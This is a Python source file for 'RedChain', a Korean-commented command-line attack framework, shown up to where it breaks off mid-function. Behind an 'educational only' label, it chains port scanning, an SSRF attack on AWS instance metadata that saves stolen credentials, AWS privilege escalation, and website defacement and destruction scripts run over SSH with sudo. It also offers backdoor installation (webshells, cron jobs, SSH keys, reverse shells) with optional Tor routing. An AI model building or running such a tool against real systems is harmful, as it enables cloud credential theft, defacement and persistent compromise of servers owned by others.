#!/usr/bin/env python3
"""
RedChain - Integrated Penetration Testing Framework
교육 및 연구 목적 전용 / Educational & Research Purpose Only
"""

import cmd
import sys
import os
import json
import subprocess
import readline
from pathlib import Path
from datetime import datetime
import requests
import time
import threading
import itertools

# 색상 정의 (Extended)
class Colors:
    # 기본 색상
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    # 그라디언트 효과용 추가 색상
    RED = '\033[91m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'

    # 배경색
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'

# 애니메이션 로더
class Loader:
    def __init__(self, desc="Loading...", end="Done!", timeout=0.1):
        self.desc = desc
        self.end = end
        self.timeout = timeout
        self._thread = None
        self.done = False

    def animate(self):
        for c in itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']):
            if self.done:
                break
            sys.stdout.write(f'\r{Colors.CYAN}{c}{Colors.ENDC} {self.desc}')
            sys.stdout.flush()
            time.sleep(self.timeout)
        sys.stdout.write(f'\r{Colors.GREEN}✓{Colors.ENDC} {self.end}\n')

    def __enter__(self):
        self.done = False
        self._thread = threading.Thread(target=self.animate)
        self._thread.start()
        return self

    def __exit__(self, exc_type, exc_value, tb):
        self.done = True
        if self._thread:
            self._thread.join()

# 프로그레스 바
def progress_bar(iteration, total, prefix='', suffix='', length=40):
    percent = f"{100 * (iteration / float(total)):.1f}"
    filled_length = int(length * iteration // total)
    bar = '█' * filled_length + '░' * (length - filled_length)

    # 그라디언트 색상
    if iteration < total / 3:
        color = Colors.RED
    elif iteration < 2 * total / 3:
        color = Colors.YELLOW
    else:
        color = Colors.GREEN

    sys.stdout.write(f'\r{prefix} {color}|{bar}|{Colors.ENDC} {percent}% {suffix}')
    sys.stdout.flush()
    if iteration == total:
        print()

# ASCII 아트 배너
def print_banner():
    banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════╗
║  {Colors.RED}██████{Colors.YELLOW}╗ {Colors.RED}███████{Colors.YELLOW}╗{Colors.GREEN}██████{Colors.CYAN}╗  {Colors.GREEN}█████{Colors.BLUE}╗{Colors.GREEN}██{Colors.CYAN}╗  {Colors.GREEN}██{Colors.BLUE}╗ {Colors.MAGENTA}█████{Colors.RED}╗ {Colors.YELLOW}██{Colors.GREEN}╗{Colors.CYAN}███{Colors.BLUE}╗   {Colors.MAGENTA}██{Colors.RED}╗{Colors.CYAN}  ║
║  {Colors.RED}██{Colors.YELLOW}╔══{Colors.RED}██{Colors.YELLOW}╗{Colors.RED}██{Colors.YELLOW}╔════╝{Colors.GREEN}██{Colors.CYAN}╔══{Colors.GREEN}██{Colors.CYAN}╗{Colors.GREEN}██{Colors.BLUE}╔══{Colors.GREEN}██{Colors.BLUE}╗{Colors.GREEN}██{Colors.CYAN}║  {Colors.GREEN}██{Colors.BLUE}║{Colors.MAGENTA}██{Colors.RED}╔══{Colors.MAGENTA}██{Colors.RED}╗{Colors.YELLOW}██{Colors.GREEN}║{Colors.CYAN}████{Colors.BLUE}╗  {Colors.MAGENTA}██{Colors.RED}║{Colors.CYAN}  ║
║  {Colors.RED}██████{Colors.YELLOW}╔╝{Colors.RED}█████{Colors.YELLOW}╗  {Colors.GREEN}██{Colors.CYAN}║  {Colors.GREEN}██{Colors.CYAN}║{Colors.GREEN}██{Colors.BLUE}║  {Colors.GREEN}██{Colors.BLUE}║{Colors.GREEN}███████{Colors.BLUE}║{Colors.MAGENTA}███████{Colors.RED}║{Colors.YELLOW}██{Colors.GREEN}║{Colors.CYAN}██{Colors.BLUE}╔{Colors.CYAN}██{Colors.BLUE}╗ {Colors.MAGENTA}██{Colors.RED}║{Colors.CYAN}  ║
║  {Colors.RED}██{Colors.YELLOW}╔══{Colors.RED}██{Colors.YELLOW}╗{Colors.RED}██{Colors.YELLOW}╔══╝  {Colors.GREEN}██{Colors.CYAN}║  {Colors.GREEN}██{Colors.CYAN}║{Colors.GREEN}██{Colors.BLUE}║  {Colors.GREEN}██{Colors.BLUE}║{Colors.GREEN}██{Colors.CYAN}╔══{Colors.GREEN}██{Colors.BLUE}║{Colors.MAGENTA}██{Colors.RED}╔══{Colors.MAGENTA}██{Colors.RED}║{Colors.YELLOW}██{Colors.GREEN}║{Colors.CYAN}██{Colors.BLUE}║╚{Colors.CYAN}██{Colors.BLUE}╗{Colors.MAGENTA}██{Colors.RED}║{Colors.CYAN}  ║
║  {Colors.RED}██{Colors.YELLOW}║  {Colors.RED}██{Colors.YELLOW}║{Colors.RED}███████{Colors.YELLOW}╗{Colors.GREEN}██████{Colors.CYAN}╔╝{Colors.GREEN}╚{Colors.BLUE}█████{Colors.GREEN}╔╝{Colors.GREEN}██{Colors.CYAN}║  {Colors.GREEN}██{Colors.BLUE}║{Colors.MAGENTA}██{Colors.RED}║  {Colors.MAGENTA}██{Colors.RED}║{Colors.YELLOW}██{Colors.GREEN}║{Colors.CYAN}██{Colors.BLUE}║ ╚{Colors.CYAN}███{Colors.MAGENTA}██{Colors.RED}║{Colors.CYAN}  ║
║  {Colors.GRAY}╚═╝  ╚═╝╚══════╝╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝{Colors.CYAN}  ║
║                                                                       ║
║           {Colors.BOLD}{Colors.WHITE}Cloud Security Penetration Testing Framework{Colors.ENDC}{Colors.CYAN}            ║
║                    {Colors.YELLOW}⚡ Powered by AI • v2.4 ⚡{Colors.CYAN}                      ║
╚═══════════════════════════════════════════════════════════════════════╝{Colors.ENDC}
    """
    print(banner)

    # 애니메이션 효과
    messages = [
        (Colors.CYAN, "🔍", "Initializing reconnaissance modules"),
        (Colors.GREEN, "🚀", "Loading AWS exploit chains"),
        (Colors.YELLOW, "⚙️ ", "Configuring persistence engines"),
        (Colors.MAGENTA, "🎯", "Ready for deployment")
    ]

    for color, icon, msg in messages:
        sys.stdout.write(f"{color}{icon}  {msg}...{Colors.ENDC}")
        sys.stdout.flush()
        time.sleep(0.3)
        sys.stdout.write(f" {Colors.GREEN}✓{Colors.ENDC}\n")
        time.sleep(0.1)

class RedChainCLI(cmd.Cmd):
    intro = ""  # Will be set in __init__ with dynamic banner
    prompt = f'{Colors.BOLD}{Colors.RED}┌─[{Colors.CYAN}redchain{Colors.RED}]{Colors.ENDC}\n{Colors.BOLD}{Colors.RED}└──╼ {Colors.WHITE}${Colors.ENDC} '

    def __init__(self):
        super().__init__()

        # 배너 출력
        print_banner()
        print()

        self.config_file = Path.home() / '.redchain_config.json'
        self.config = self.load_config()
        self.target = self.config.get('target', None)
        self.use_tor = self.config.get('use_tor', False)
        self.ssh_user = self.config.get('ssh_user', 'ec2-user')
        self.ssh_key = self.config.get('ssh_key', None)
        self.ssh_pass = self.config.get('ssh_pass', None)

        # AWS credentials 저장용
        self.aws_credentials = None

        # 프로젝트 루트 경로 자동 탐지
        # 심볼릭 링크 경로 해결
        script_path = Path(__file__).resolve()  # 심볼릭 링크의 실제 경로
        script_dir = script_path.parent

        # 개발 환경: /path/to/CLEAN_PROJECT/06_Integrated_Tool/redchain.py
        # 배포 환경: /path/to/redchain/redchain.py
        if script_dir.name == '06_Integrated_Tool':
            # 개발 환경
            self.project_root = script_dir.parent
        else:
            # 배포 환경 (압축 해제 후)
            self.project_root = script_dir

        # 시작 메시지
        print(f"\n{Colors.GRAY}┌─────────────────────────────────────────────────────────────┐{Colors.ENDC}")
        print(f"{Colors.GRAY}│{Colors.ENDC} {Colors.CYAN}Type {Colors.WHITE}help{Colors.CYAN} or {Colors.WHITE}?{Colors.CYAN} to see available commands{Colors.ENDC}              {Colors.GRAY}│{Colors.ENDC}")
        print(f"{Colors.GRAY}│{Colors.ENDC} {Colors.CYAN}Type {Colors.WHITE}help <command>{Colors.CYAN} for detailed information{Colors.ENDC}           {Colors.GRAY}│{Colors.ENDC}")
        print(f"{Colors.GRAY}│{Colors.ENDC} {Colors.CYAN}Type {Colors.WHITE}exit{Colors.CYAN} or {Colors.WHITE}quit{Colors.CYAN} to terminate the session{Colors.ENDC}          {Colors.GRAY}│{Colors.ENDC}")
        print(f"{Colors.GRAY}└─────────────────────────────────────────────────────────────┘{Colors.ENDC}\n")

    def load_config(self):
        """설정 파일 로드"""
        if self.config_file.exists():
            with open(self.config_file, 'r') as f:
                return json.load(f)
        return {}

    def save_config(self):
        """설정 파일 저장"""
        with open(self.config_file, 'w') as f:
            json.dump({
                'target': self.target,
                'use_tor': self.use_tor,
                'ssh_user': self.ssh_user,
                'ssh_key': self.ssh_key,
                'ssh_pass': self.ssh_pass
            }, f, indent=2)
        print(f"{Colors.OKGREEN}[+] 설정 저장됨: {self.config_file}{Colors.ENDC}")

    def update_prompt(self):
        """프롬프트 업데이트"""
        if self.target:
            target_display = f"{Colors.GREEN}{self.target}{Colors.ENDC}"
        else:
            target_display = f"{Colors.RED}no-target{Colors.ENDC}"

        tor_display = f" {Colors.YELLOW}🧅{Colors.ENDC}" if self.use_tor else ""

        self.prompt = f'{Colors.BOLD}{Colors.RED}┌─[{Colors.CYAN}redchain{Colors.RED}@{target_display}{tor_display}{Colors.RED}]{Colors.ENDC}\n{Colors.BOLD}{Colors.RED}└──╼ {Colors.WHITE}${Colors.ENDC} '

    # ==================== 설정 명령어 ====================

    def do_set(self, arg):
        """설정 변경

사용법:
    set target <IP 또는 도메인>   - 타겟 서버 설정
    set ssh_user <사용자명>       - SSH 사용자 설정
    set ssh_key <경로>            - SSH 키 경로 설정
    set ssh_pass <비밀번호>       - SSH 비밀번호 설정
    set tor on|off                - Tor 사용 설정

예제:
    set target 52.79.240.83
    set target example.com
    set ssh_user sysadmin
    set ssh_key ~/.ssh/my-key.pem
    set ssh_pass Adm1n!2024#Secure
    set tor on
"""
        args = arg.split(maxsplit=1)  # 비밀번호에 공백이 있을 수 있으므로
        if len(args) < 2:
            print(f"{Colors.FAIL}[-] 사용법: set <옵션> <값>{Colors.ENDC}")
            return

        option = args[0].lower()
        value = args[1]

        if option == 'target':
            # URL에서 도메인/IP만 추출 (http://, https://, 뒤의 / 제거)
            clean_target = value
            clean_target = clean_target.replace('http://', '').replace('https://', '')
            clean_target = clean_target.rstrip('/')

            self.target = clean_target

            if clean_target != value:
                print(f"{Colors.WARNING}[!] URL 형식 자동 정리: {value} → {clean_target}{Colors.ENDC}")
            print(f"{Colors.OKGREEN}[+] 타겟 설정됨: {clean_target}{Colors.ENDC}")
        elif option == 'ssh_user':
            self.ssh_user = value
            print(f"{Colors.OKGREEN}[+] SSH 사용자 설정됨: {value}{Colors.ENDC}")
        elif option == 'ssh_key':
            self.ssh_key = os.path.expanduser(value)
            print(f"{Colors.OKGREEN}[+] SSH 키 설정됨: {self.ssh_key}{Colors.ENDC}")
        elif option == 'ssh_pass':
            self.ssh_pass = value
            print(f"{Colors.OKGREEN}[+] SSH 비밀번호 설정됨: {'*' * len(value)}{Colors.ENDC}")
        elif option == 'tor':
            if value.lower() in ['on', 'true', '1']:
                self.use_tor = True
                print(f"{Colors.WARNING}[+] Tor 활성화됨{Colors.ENDC}")
            else:
                self.use_tor = False
                print(f"{Colors.OKGREEN}[+] Tor 비활성화됨{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[-] 알 수 없는 옵션: {option}{Colors.ENDC}")
            return

        self.save_config()
        self.update_prompt()

    def do_show(self, arg):
        """현재 설정 표시

사용법:
    show          - 모든 설정 표시
    show target   - 타겟 정보만 표시
    show config   - 전체 설정 표시
"""
        print(f"\n{Colors.BOLD}현재 설정:{Colors.ENDC}")
        print(f"  타겟:        {Colors.OKCYAN}{self.target or '(미설정)'}{Colors.ENDC}")
        print(f"  SSH 사용자:  {Colors.OKCYAN}{self.ssh_user}{Colors.ENDC}")
        print(f"  SSH 키:      {Colors.OKCYAN}{self.ssh_key or '(미설정)'}{Colors.ENDC}")
        print(f"  SSH 비밀번호: {Colors.OKCYAN}{'*' * len(self.ssh_pass) if self.ssh_pass else '(미설정)'}{Colors.ENDC}")
        print(f"  Tor 사용:    {Colors.OKCYAN}{'Yes' if self.use_tor else 'No'}{Colors.ENDC}")
        print()

    # ==================== 정찰 명령어 ====================

    def do_scan(self, arg):
        """포트 스캔 실행

사용법:
    scan           - 기본 포트 스캔 (80, 443, 22, 3306)
    scan full      - 전체 포트 스캔 (1-65535)
    scan <포트>    - 특정 포트 스캔

예제:
    scan
    scan full
    scan 80,443,8080
"""
        if not self.target:
            print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다. 'set target <IP>' 먼저 실행하세요.{Colors.ENDC}")
            return

        print(f"\n{Colors.CYAN}╔{'═'*68}╗{Colors.ENDC}")
        print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}  Network Port Scanning{Colors.ENDC}{' '*47}{Colors.CYAN}║{Colors.ENDC}")
        print(f"{Colors.CYAN}╚{'═'*68}╝{Colors.ENDC}\n")

        print(f"{Colors.CYAN}🎯 Target:{Colors.ENDC} {Colors.WHITE}{self.target}{Colors.ENDC}")

        if arg == 'full':
            ports = '1-65535'
            scan_type = "Full port scan"
        elif arg:
            ports = arg
            scan_type = f"Custom ports: {arg}"
        else:
            ports = '22,80,443,3306,8080,8443'
            scan_type = "Common ports"

        print(f"{Colors.CYAN}📡 Scan type:{Colors.ENDC} {Colors.YELLOW}{scan_type}{Colors.ENDC}\n")

        # nmap 사용
        cmd = f"nmap -p {ports} -sV -T4 {self.target}"

        if self.use_tor:
            print(f"{Colors.WARNING}⚠️  Tor를 통한 스캔은 매우 느릴 수 있습니다.{Colors.ENDC}\n")
            cmd = f"proxychains4 -q {cmd}"

        with Loader(desc=f"{Colors.CYAN}Preparing nmap scanner...{Colors.ENDC}",
                   end=f"{Colors.GREEN}Scanner ready{Colors.ENDC}"):
            time.sleep(0.5)

        print(f"{Colors.GRAY}[cmd]{Colors.ENDC} {cmd}\n")
        os.system(cmd)

    def do_enum(self, arg):
        """엔드포인트 탐색

사용법:
    enum           - 기본 디렉터리 탐색
    enum api       - API 엔드포인트 탐색
    enum admin     - 관리자 페이지 탐색
    enum <wordlist> - 사용자 지정 워드리스트 사용

예제:
    enum
    enum api
    enum /usr/share/wordlists/dirb/common.txt
"""
        if not self.target:
            print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다.{Colors.ENDC}")
            return

        print(f"{Colors.OKBLUE}[*] 엔드포인트 탐색: {self.target}{Colors.ENDC}")

        # gobuster 또는 ffuf 사용
        if arg == 'api':
            wordlist = '/usr/share/wordlists/dirb/common.txt'
            extensions = 'php,json,xml'
        elif arg == 'admin':
            wordlist = '/usr/share/wordlists/dirb/common.txt'
            extensions = 'php,html'
        elif arg:
            wordlist = arg
            extensions = 'php,html,txt,json'
        else:
            wordlist = '/usr/share/wordlists/dirb/common.txt'
            extensions = 'php,html,txt'

        url = f"http://{self.target}"

        # ffuf 사용
        cmd = f"ffuf -w {wordlist} -u {url}/FUZZ -e .{extensions.replace(',', ',.')} -mc 200,301,302,403"

        if self.use_tor:
            # Tor SOCKS5 프록시 사용
            cmd += " -x socks5://127.0.0.1:9050"

        print(f"{Colors.OKCYAN}[*] 실행 중: {cmd}{Colors.ENDC}\n")
        os.system(cmd)

    # ==================== 유틸리티 함수 ====================

    def check_dependencies(self):
        """필수 의존성 체크 및 설치"""
        missing = []

        # boto3 체크
        try:
            import boto3
        except ImportError:
            missing.append('boto3')

        # botocore 체크
        try:
            import botocore
        except ImportError:
            missing.append('botocore')

        if missing:
            print(f"{Colors.WARNING}[!] 필수 Python 패키지가 설치되어 있지 않습니다: {', '.join(missing)}{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[*] 자동 설치를 시도합니다...{Colors.ENDC}\n")

            install_cmd = f"pip3 install {' '.join(missing)}"
            print(f"{Colors.OKCYAN}[*] {install_cmd}{Colors.ENDC}\n")

            result = os.system(install_cmd)

            if result == 0:
                print(f"\n{Colors.OKGREEN}[+] 의존성 설치 완료!{Colors.ENDC}\n")
                return True
            else:
                print(f"\n{Colors.FAIL}[-] 자동 설치 실패. 수동으로 설치하세요:{Colors.ENDC}")
                print(f"    sudo apt install -y python3-boto3")
                print(f"    또는: pip3 install boto3 botocore\n")
                return False

        return True

    def load_latest_credentials(self):
        """가장 최근 탈취한 AWS credentials 로드"""
        # 현재 디렉터리에서 aws_stolen_*.json 파일 찾기
        json_files = sorted(Path('.').glob('aws_stolen_*.json'), key=lambda p: p.stat().st_mtime, reverse=True)

        if not json_files:
            return None

        latest_file = json_files[0]

        try:
            with open(latest_file, 'r') as f:
                data = json.load(f)

            creds = data.get('credentials')
            if creds and 'AccessKeyId' in creds:
                print(f"{Colors.OKGREEN}[+] AWS credentials 자동 로드: {latest_file}{Colors.ENDC}")
                print(f"{Colors.OKCYAN}[*] AccessKeyId: {creds['AccessKeyId']}{Colors.ENDC}")
                print(f"{Colors.OKCYAN}[*] Expiration: {creds.get('Expiration', 'N/A')}{Colors.ENDC}\n")
                return creds

        except Exception as e:
            print(f"{Colors.WARNING}[!] Credentials 로드 실패: {str(e)}{Colors.ENDC}\n")
            return None

        return None

    # ==================== 공격 명령어 ====================

    def do_imds(self, arg):
        """AWS IMDS 공격 실행

사용법:
    imds           - IMDS 취약점 공격 자동 실행
    imds check     - IMDS 접근 가능 여부만 확인

이 명령어는 01_AWS_IMDS_Attack/120_aws_imds_exploit.py를 실행합니다.
"""
        if not self.target:
            print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다.{Colors.ENDC}")
            return

        script_path = self.project_root / '01_AWS_IMDS_Attack' / '120_aws_imds_exploit.py'

        if not script_path.exists():
            print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
            return

        print(f"\n{Colors.CYAN}╔{'═'*68}╗{Colors.ENDC}")
        print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}  AWS Instance Metadata Service (IMDS) Exploit{Colors.ENDC}{' '*23}{Colors.CYAN}║{Colors.ENDC}")
        print(f"{Colors.CYAN}╚{'═'*68}╝{Colors.ENDC}\n")

        print(f"{Colors.CYAN}🎯 Target:{Colors.ENDC} {Colors.WHITE}{self.target}{Colors.ENDC}")
        print(f"{Colors.CYAN}🔍 Attack:{Colors.ENDC} {Colors.YELLOW}SSRF → IMDSv1 → IAM Credentials{Colors.ENDC}\n")

        with Loader(desc=f"{Colors.CYAN}Initializing IMDS exploit module...{Colors.ENDC}",
                   end=f"{Colors.GREEN}Exploit module loaded{Colors.ENDC}"):
            time.sleep(0.7)

        # Tor 설정을 위해 환경 변수 설정
        env = os.environ.copy()
        if not self.use_tor:
            env['DISABLE_TOR'] = '1'

        cmd = f"python3 {script_path} {self.target}"

        print(f"{Colors.GRAY}[cmd]{Colors.ENDC} {cmd}\n")
        subprocess.run(cmd, shell=True, env=env)

        # 공격 성공 후 credentials 자동 로드
        print(f"\n{Colors.CYAN}🔑 Attempting to load stolen credentials...{Colors.ENDC}\n")

        with Loader(desc=f"{Colors.CYAN}Parsing credential files...{Colors.ENDC}",
                   end=f"{Colors.GREEN}Credentials parsed{Colors.ENDC}"):
            time.sleep(0.3)
            self.aws_credentials = self.load_latest_credentials()

        if self.aws_credentials:
            print(f"\n{Colors.GREEN}✓ Next step: Use{Colors.ENDC} {Colors.WHITE}escalate aws{Colors.ENDC} {Colors.GREEN}to enumerate AWS resources{Colors.ENDC}\n")

    def do_escalate(self, arg):
        """권한 상승

사용법:
    escalate aws    - AWS 리소스 열거 및 권한 확인
    escalate linux  - 리눅스 권한 상승 자동화 (웹쉘 필요)

AWS: 01_AWS_IMDS_Attack/121_aws_privilege_escalation.py 실행
Linux: 04_Privilege_Escalation/privesc_enum.py 실행
"""
        if arg == 'linux':
            # 리눅스 권한 상승
            if not self.target:
                print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다.{Colors.ENDC}")
                return

            script_path = self.project_root / '04_Privilege_Escalation' / 'privesc_enum.py'

            if not script_path.exists():
                print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
                return

            print(f"\n{Colors.CYAN}╔{'═'*68}╗{Colors.ENDC}")
            print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}  Linux Privilege Escalation Automation{Colors.ENDC}{' '*30}{Colors.CYAN}║{Colors.ENDC}")
            print(f"{Colors.CYAN}╚{'═'*68}╝{Colors.ENDC}\n")

            with Loader(desc=f"{Colors.CYAN}Launching privilege escalation enumeration...{Colors.ENDC}",
                       end=f"{Colors.GREEN}Privilege escalation module loaded{Colors.ENDC}"):
                time.sleep(1)

            cmd = f"python3 {script_path} {self.target}"
            print(f"{Colors.GRAY}[cmd]{Colors.ENDC} {cmd}\n")
            os.system(cmd)
            return

        # AWS 권한 상승 (기본)
        # 의존성 체크
        if not self.check_dependencies():
            print(f"{Colors.FAIL}[-] 필수 패키지가 설치되지 않아 중단합니다.{Colors.ENDC}\n")
            return

        # Credentials 자동 로드 시도
        if not self.aws_credentials:
            print(f"{Colors.OKBLUE}[*] 저장된 credentials 로드 시도...{Colors.ENDC}\n")
            self.aws_credentials = self.load_latest_credentials()

        if not self.aws_credentials:
            print(f"{Colors.WARNING}[!] AWS credentials를 찾을 수 없습니다.{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] 먼저 'imds' 명령어를 실행하세요.{Colors.ENDC}\n")
            return

        script_path = self.project_root / '01_AWS_IMDS_Attack' / '121_aws_privilege_escalation.py'

        if not script_path.exists():
            print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
            return

        print(f"\n{Colors.CYAN}╔{'═'*68}╗{Colors.ENDC}")
        print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}  AWS Privilege Escalation{Colors.ENDC}{' '*44}{Colors.CYAN}║{Colors.ENDC}")
        print(f"{Colors.CYAN}╚{'═'*68}╝{Colors.ENDC}\n")

        with Loader(desc=f"{Colors.CYAN}Loading AWS credentials...{Colors.ENDC}",
                   end=f"{Colors.GREEN}Credentials loaded successfully{Colors.ENDC}"):
            time.sleep(0.5)

        # 환경 변수로 credentials 전달
        env = os.environ.copy()
        env['AWS_ACCESS_KEY_ID'] = self.aws_credentials['AccessKeyId']
        env['AWS_SECRET_ACCESS_KEY'] = self.aws_credentials['SecretAccessKey']
        env['AWS_SESSION_TOKEN'] = self.aws_credentials.get('Token', '')

        cmd = f"python3 {script_path}"
        print(f"{Colors.GRAY}[cmd]{Colors.ENDC} {cmd}\n")
        subprocess.run(cmd, shell=True, env=env)

    def do_deface(self, arg):
        """웹사이트 변조

사용법:
    deface           - 모던 해킹 페이지 + 자동 다운로드 (.jpg 위장)
    deface toggle    - 원본/해킹 토글
    deface restore   - 원본 복구 (toggle과 동일)
    deface destroy   - 최종 파괴 (FINAL_DESTRUCTION)
    deface reset     - 모든 백업 삭제 (처음부터 다시 시작)

주의: SSH 접속이 필요합니다.
"""
        if not self.target:
            print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다.{Colors.ENDC}")
            return

        if not self.ssh_user:
            print(f"{Colors.FAIL}[-] SSH 사용자가 설정되지 않았습니다.{Colors.ENDC}")
            return

        # 스크립트 선택
        if arg == 'toggle' or arg == 'restore':
            script_name = 'TOGGLE_MODERN_FIXED.sh'
        elif arg == 'destroy':
            script_name = 'FINAL_DESTRUCTION.sh'
        elif arg == 'reset':
            script_name = 'RESET_ALL.sh'
        else:
            script_name = 'MODERN_DEFACEMENT_FIXED.sh'

        script_path = self.project_root / '02_Site_Defacement' / script_name

        if not script_path.exists():
            print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
            return

        print(f"{Colors.WARNING}[!] 웹사이트 변조를 실행합니다.{Colors.ENDC}")

        # SSH 인증 방식 결정
        if self.ssh_key:
            # SSH 키 사용
            sshpass_prefix = ""
            ssh_opts = f"-i {self.ssh_key} -o StrictHostKeyChecking=no"
        elif self.ssh_pass:
            # 비밀번호 사용 (sshpass)
            sshpass_prefix = f"sshpass -p '{self.ssh_pass}' "
            ssh_opts = "-o StrictHostKeyChecking=no"
        else:
            # 인증 정보 없음
            sshpass_prefix = ""
            ssh_opts = "-o StrictHostKeyChecking=no"

        # 예전 스크립트 삭제 (항상 최신 버전 사용)
        print(f"{Colors.OKBLUE}[*] 1. 예전 스크립트 삭제 중...{Colors.ENDC}")
        rm_cmd = f"{sshpass_prefix}ssh {ssh_opts} {self.ssh_user}@{self.target} 'rm -f /tmp/{script_name}'"
        os.system(rm_cmd + " 2>/dev/null")

        print(f"{Colors.OKBLUE}[*] 2. 타겟 서버로 최신 스크립트 전송{Colors.ENDC}")

        # SCP로 스크립트 전송
        scp_cmd = f"{sshpass_prefix}scp {ssh_opts} {script_path} {self.ssh_user}@{self.target}:/tmp/"
        print(f"{Colors.OKCYAN}[*] 파일 전송 중...{Colors.ENDC}")
        result = os.system(scp_cmd)

        if result != 0:
            print(f"{Colors.FAIL}[-] 파일 전송 실패{Colors.ENDC}")
            return

        print(f"{Colors.OKGREEN}[+] 파일 전송 완료{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] 3. 타겟 서버에서 스크립트 실행{Colors.ENDC}")

        # SSH로 실행
        ssh_cmd = f"{sshpass_prefix}ssh {ssh_opts} {self.ssh_user}@{self.target} 'sudo bash /tmp/{script_name}'"
        print(f"{Colors.OKCYAN}[*] 실행 중...{Colors.ENDC}\n")
        os.system(ssh_cmd)

    def do_persist(self, arg):
        """Persistence 백도어 설치 (Red Team 시뮬레이션) - SSH 불필요!

사용법:
    persist aggressive  - 🔥 공격적 백도어 (ALL-IN-ONE, 추천!) 🔥
    persist webshell    - 웹쉘을 통한 백도어 설치 (SSH 불필요)
    persist php         - PHP 전용 백도어 (www-data 권한)
    persist ssm         - AWS SSM을 통한 백도어 설치 (SSH 불필요)
    persist ssh         - SSH를 통한 백도어 설치 (레거시)
    persist cleanup     - 모든 백도어 제거
    persist info        - 백도어 정보 표시

경고: 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!
"""
        if not self.target:
            print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다.{Colors.ENDC}")
            return

        # 방식 선택
        if arg == 'aggressive':
            # 공격적 백도어 - 모든 방법 시도
            script_path = self.project_root / '03_Persistence' / 'aggressive_backdoor.py'

            if not script_path.exists():
                print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
                return

            print(f"\n{Colors.RED}╔{'═'*68}╗{Colors.ENDC}")
            print(f"{Colors.RED}║{Colors.BOLD}{Colors.YELLOW}  🔥 공격적 백도어 설치 - ALL-IN-ONE 🔥{Colors.ENDC}{' '*27}{Colors.RED}║{Colors.ENDC}")
            print(f"{Colors.RED}╚{'═'*68}╝{Colors.ENDC}\n")

            print(f"{Colors.RED}[!] 이 명령어는 가능한 모든 백도어를 시도합니다:{Colors.ENDC}")
            print(f"    {Colors.YELLOW}✓{Colors.ENDC} PHP 웹쉘 (7개 위치)")
            print(f"    {Colors.YELLOW}✓{Colors.ENDC} 시스템 사용자")
            print(f"    {Colors.YELLOW}✓{Colors.ENDC} SSH 키 백도어")
            print(f"    {Colors.YELLOW}✓{Colors.ENDC} Cron 작업")
            print(f"    {Colors.YELLOW}✓{Colors.ENDC} .htaccess 백도어")
            print(f"    {Colors.YELLOW}✓{Colors.ENDC} 이미지 위장 웹쉘")
            print(f"    {Colors.YELLOW}✓{Colors.ENDC} PHP auto_prepend")
            print(f"    {Colors.YELLOW}✓{Colors.ENDC} 로그 파일 포이즈닝")
            print(f"    {Colors.YELLOW}✓{Colors.ENDC} 리버스 쉘 스크립트")
            print(f"\n{Colors.RED}[!] 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!{Colors.ENDC}\n")

            confirm = input(f"{Colors.YELLOW}전면 공격을 시작하시겠습니까? (yes/no): {Colors.ENDC}")
            if confirm.lower() != 'yes':
                print(f"{Colors.FAIL}[-] 취소됨{Colors.ENDC}")
                return

            print()
            with Loader(desc=f"{Colors.RED}Loading aggressive backdoor module...{Colors.ENDC}",
                       end=f"{Colors.GREEN}Module loaded - Attack initiated!{Colors.ENDC}"):
                time.sleep(1)

            tor_flag = "--tor" if self.use_tor else ""
            cmd = f"python3 {script_path} {self.target} {tor_flag}"
            print(f"{Colors.GRAY}[cmd]{Colors.ENDC} {cmd}\n")
            os.system(cmd)
            return

        elif arg == 'php':
            # PHP 전용 백도어
            script_path = self.project_root / '03_Persistence' / 'php_only_backdoor.py'

            if not script_path.exists():
                print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
                return

            print(f"{Colors.WARNING}[!] PHP 전용 백도어 설치 (www-data 권한){Colors.ENDC}")
            print(f"{Colors.FAIL}[!] 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!{Colors.ENDC}\n")

            confirm = input(f"{Colors.WARNING}계속하시겠습니까? (yes/no): {Colors.ENDC}")
            if confirm.lower() != 'yes':
                print(f"{Colors.FAIL}[-] 취소됨{Colors.ENDC}")
                return

            tor_flag = "--tor" if self.use_tor else ""
            cmd = f"python3 {script_path} {self.target} {tor_flag}"
            print(f"{Colors.OKCYAN}[*] 실행 중: {cmd}{Colors.ENDC}\n")
